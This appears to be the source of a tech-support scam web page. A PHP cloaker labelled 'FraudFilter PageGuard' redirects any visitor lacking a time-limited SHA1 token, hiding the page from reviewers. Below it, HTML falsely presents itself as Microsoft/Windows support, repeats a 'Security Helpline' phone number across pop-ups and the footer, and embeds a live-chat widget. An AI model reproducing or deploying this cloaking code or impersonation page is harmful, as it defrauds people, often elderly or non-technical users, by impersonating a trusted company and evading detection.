<?php /* FraudFilter PageGuard 1.0.0 */ $q = false; $d = 10; foreach ($_GET as $g) { if (strlen($g) < 40) continue; $t = substr($g, 0, 10); $h = substr($g, 10); if (!is_numeric($t)) continue; $s = $t.'678d0c35d8996c92f58150baad4630ee8db3021e'; if (time() < $t + $d && sha1($s) == $h) { $q = true; break; } } if (!$q) { header('Location: https://www.google.com/fuckyou'); exit(); } ?>
<!doctype html>
<html lang="en">
<head>
...
s1.async=true;
s1.src='https://embed.tawk.to/5e443471298c395d1ce79b41/default';
s1.charset='UTF-8';
            ...
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt"><img src="microsoft.png"> Microsoft: </span><span
                        style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Support <span
                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-833-530-2441 (Security Helpline)</span></span>
            </div>
        </div>
        <div class="col-md-12">
...
<div id="poptxt" class="lightbox">
    ...
    <div id="disclaimer">
        ...
        <span class="support">Contact Windows Support: +1-833-530-2441 (Security Helpline)</span>
    </div>
    <div id="bottom">
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    ...
    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Microsoft Support: <strong>
            +1-833-530-2441 (Security Helpline) </strong></p>
